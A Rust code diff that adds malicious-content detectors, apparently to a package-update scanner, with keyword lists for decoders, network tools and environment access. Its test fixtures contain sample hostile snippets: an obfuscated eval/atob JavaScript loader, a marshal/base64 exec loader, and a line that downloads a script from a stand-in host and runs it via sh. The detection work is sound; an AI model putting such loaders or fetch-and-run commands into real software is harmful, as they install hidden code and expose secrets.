@@ -5,6 +5,8 @@ use std::fs;
 use std::io;
 use std::path::{Path, PathBuf};
 
+const MAX_SIGNAL_FILE_BYTES: usize = 128 * 1024;
+
 use serde_json::Value as JsonValue;
 use toml::Value as TomlValue;
 
@@ -191,6 +193,57 @@ fn analyze_generic_file_signals(
 
         if is_binary_added(new_root, entry)? {
             builder.push_signal(Signal::BinaryAdded);
+        }
+    }
+
+    for suspicious_path in diff.added_paths.iter().chain(&diff.modified_paths) {
+        let file_path = new_root.join(suspicious_path);
+        let Some(text) = read_optional_signal_text(&file_path)? else {
+            continue;
+        };
+
+        if obfuscated_js_added(&text) {
+            builder.push_signal_with_excerpt(
+                Signal::ObfuscatedJsAdded,
+                suspicious_path.clone(),
+                "obfuscated javascript added",
+                vec![
+                    "eval(".to_string(),
+                    "atob".to_string(),
+                    "fromcharcode".to_string(),
+                ],
+            );
+        }
+
+        if suspicious_python_loader_added(&text) {
+            builder.push_signal_with_excerpt(
+                Signal::SuspiciousPythonLoaderAdded,
+                suspicious_path.clone(),
+                "suspicious python loader added",
+                vec![
+                    "exec(".to_string(),
+                    "base64".to_string(),
+                    "marshal".to_string(),
+                ],
+            );
+        }
+
+        if large_encoded_blob_added(&text) {
+            builder.push_signal_with_excerpt(
+                Signal::LargeEncodedBlobAdded,
+                suspicious_path.clone(),
+                "large encoded blob added",
+                Vec::new(),
+            );
+        }
+
+        if network_process_env_access_added(&text) {
+            builder.push_signal_with_excerpt(
+                Signal::NetworkProcessEnvAccessAdded,
+                suspicious_path.clone(),
+                "network/process/env access added",
+                vec!["http".to_string(), "exec".to_string(), "env".to_string()],
+            );
         }
     }
 
@@ -639,6 +692,109 @@ fn read_optional_text(path: PathBuf) -> Result<Option<String>, SignalError> {
         Err(source) if source.kind() == io::ErrorKind::NotFound => Ok(None),
         Err(source) => Err(SignalError::Io { path, source }),
     }
+}
+
+fn read_optional_signal_text(path: &Path) -> Result<Option<String>, SignalError> {
+    match fs::read(path) {
+        Ok(bytes) => {
+            let bytes = if bytes.len() > MAX_SIGNAL_FILE_BYTES {
+                &bytes[..MAX_SIGNAL_FILE_BYTES]
+            } else {
+                &bytes[..]
+            };
+            if bytes.contains(&0) {
+                return Ok(None);
+            }
+            Ok(Some(String::from_utf8_lossy(bytes).into_owned()))
+        }
+        Err(source) if source.kind() == io::ErrorKind::NotFound => Ok(None),
+        Err(source) => Err(SignalError::Io {
+            path: path.to_path_buf(),
+            source,
+        }),
+    }
+}
+
+fn obfuscated_js_added(text: &str) -> bool {
+    let lowered = text.to_lowercase();
+    let has_eval = lowered.contains("eval(")
+        || lowered.contains("function(")
+        || lowered.contains("new function");
+    let has_decode = lowered.contains("atob(")
+        || lowered.contains("fromcharcode")
+        || lowered.contains("unescape(")
+        || lowered.contains("decodeuri(")
+        || lowered.contains("decodeuricomponent(")
+        || lowered.contains("\\x");
+    let has_long_line = text.lines().any(|line| line.len() > 160);
+    has_eval && has_decode && has_long_line
+}
+
+fn suspicious_python_loader_added(text: &str) -> bool {
+    let lowered = text.to_lowercase();
+    let has_loader = lowered.contains("exec(")
+        || lowered.contains("eval(")
+        || lowered.contains("compile(")
+        || lowered.contains("__import__");
+    let has_decode = lowered.contains("base64.b64decode")
+        || lowered.contains("marshal.loads")
+        || lowered.contains("zlib.decompress")
+        || lowered.contains("codecs.decode");
+    has_loader && has_decode
+}
+
+fn large_encoded_blob_added(text: &str) -> bool {
+    text.lines().any(|line| {
+        let trimmed = line.trim();
+        trimmed.len() >= 256
+            && trimmed
+                .bytes()
+                .filter(|byte| matches!(byte, b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'+' | b'/' | b'=' | b'-' | b'_'))
+                .count()
+                * 10
+                >= trimmed.len() * 9
+    })
+}
+
+fn network_process_env_access_added(text: &str) -> bool {
+    let lowered = text.to_lowercase();
+    let has_network = [
+        "http://",
+        "https://",
+        "fetch(",
+        "axios",
+        "requests.",
+        "urllib",
+        "socket",
+        "net.connect",
+        "curl ",
+        "wget ",
+    ]
+    .iter()
+    .any(|needle| lowered.contains(needle));
+    let has_process = [
+        "exec(",
+        "spawn(",
+        "subprocess",
+        "child_process",
+        "os.system",
+        "processbuilder",
+        "runtime.getruntime",
+    ]
+    .iter()
+    .any(|needle| lowered.contains(needle));
+    let has_env = [
+        "process.env",
+        "getenv(",
+        "os.environ",
+        "env[",
+        "std::env",
+        "system.getenv",
+    ]
+    .iter()
+    .any(|needle| lowered.contains(needle));
+
+    has_network && has_process && has_env
 }
 
 fn find_changed_path<F>(diff: &DiffSummary, predicate: F) -> Option<String>
@@ -1316,6 +1472,85 @@ mod tests {
             .interesting_files
             .iter()
             .any(|excerpt| excerpt.path == "build.rs"));
+    }
+
+    #[test]
+    fn detects_obfuscated_blob_and_network_loader_signals() {
+        let old_root = TestDir::new("content-old");
+        let new_root = TestDir::new("content-new");
+        fs::create_dir_all(new_root.path().join("src")).expect("src dir should exist");
+        fs::create_dir_all(new_root.path().join("scripts")).expect("scripts dir should exist");
+        fs::create_dir_all(new_root.path().join("tools")).expect("tools dir should exist");
+        fs::write(
+            new_root.path().join("src/obf.js"),
+            concat!(
+                "const payload = \"",
+                "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB",
+                "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB",
+                "QUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB",
+                "\";\n",
+                "eval(String.fromCharCode.apply(null, atob(payload).split('').map((c) => c.charCodeAt(0))));\n"
+            ),
+        )
+        .expect("obfuscated js should be written");
+        fs::write(
+            new_root.path().join("scripts/loader.py"),
+            "import base64, marshal\nexec(marshal.loads(base64.b64decode(DATA)))\n",
+        )
+        .expect("loader.py should be written");
+        fs::write(
+            new_root.path().join("tools/collector.py"),
+            "import os, subprocess, urllib.request\nsubprocess.run(['sh', '-c', urllib.request.urlopen('https://example.test').read().decode()])\nos.environ.get('TOKEN')\n",
+        )
+        .expect("collector.py should be written");
+
+        let analysis = SignalAnalysis::analyze_v0(
+            Ecosystem::Pypi,
+            old_root.path(),
+            new_root.path(),
+            &InventorySummary::default(),
+            &InventorySummary::default(),
+            &DiffSummary {
+                files_added: 3,
+                changed_paths: vec![
+                    "src/obf.js".to_string(),
+                    "scripts/loader.py".to_string(),
+                    "tools/collector.py".to_string(),
+                ],
+                added_paths: vec![
+                    "src/obf.js".to_string(),
+                    "scripts/loader.py".to_string(),
+                    "tools/collector.py".to_string(),
+                ],
+                ..DiffSummary::default()
+            },
+        )
+        .expect("content signal analysis should succeed");
+
+        assert_eq!(
+            analysis.signals,
+            vec![
+                Signal::ObfuscatedJsAdded,
+                Signal::LargeEncodedBlobAdded,
+                Signal::SuspiciousPythonLoaderAdded,
+                Signal::NetworkProcessEnvAccessAdded,
+            ]
+        );
+        assert!(analysis
+            .interesting_files
+            .iter()
+            .any(|excerpt| excerpt.path == "src/obf.js"
+                && excerpt.reason == "obfuscated javascript added"));
+        assert!(analysis
+            .interesting_files
+            .iter()
+            .any(|excerpt| excerpt.path == "scripts/loader.py"
+                && excerpt.reason == "suspicious python loader added"));
+        assert!(analysis
+            .interesting_files
+            .iter()
+            .any(|excerpt| excerpt.path == "tools/collector.py"
+                && excerpt.reason == "network/process/env access added"));
     }
 
     #[test]
